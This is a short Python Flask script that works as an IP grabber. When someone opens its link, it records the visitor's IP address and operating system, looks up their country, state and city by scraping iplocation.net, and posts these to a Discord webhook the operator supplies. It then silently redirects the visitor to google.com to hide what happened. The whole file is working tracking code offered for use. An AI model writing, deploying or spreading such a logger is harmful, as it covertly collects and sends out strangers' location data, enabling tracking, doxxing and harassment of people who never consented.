import requests
from flask import Flask
from flask import request
from flask import redirect


def find_index(text, i1, i2):
  x = i1
  while text[x] != i2: x += 1
  return text[i1:x]

def parseResponse(response, ip):
  start = response.index('<tr><td>'+ip)+len(ip)+8
  x = start
  while response[x:x+8] != '</tbody>': x += 1
  parse = response[start:x]
  parse = parse.replace('<td>','').replace('</tr>','')
  location = {}
  location['country'] = find_index(parse, 5, '<')[:-1]
  location['state'] = parse.split('</td>')[2].replace('\n','').replace('\t','')
  location['city'] = parse.split('</td>')[3]
  return location

def processIP():
  webhookurl = 'YOUR DISCORD WEBHOOK HERE!!!!'

  ip = request.headers.get('x-forwarded-for')

  response = requests.post('https://www.iplocation.net/ip-lookup', data = {'query':ip, 'submit':'IP Lookup'})
  location = parseResponse(response.text, ip)

  data = {}
  data['embeds'] = [
    {
      'title': '⚠️ New IP! ⚠️',
      'description': '**IP:** ' + ip + '\n**OS:** ' + request.headers.get('Sec-Ch-Ua-Platform').replace('"','') + '\n**Country:** ' + location['country'] + '\n**State:** ' + location['state'] + '\n**City:** ' + location['city']
    }
  ]

  requests.post(webhookurl, json = data)

app = Flask('')

@app.route('/')
def home():
  processIP()
  print(request.headers)
  return redirect('https://google.com/', code = 302)

app.run(host='0.0.0.0',port=8080)
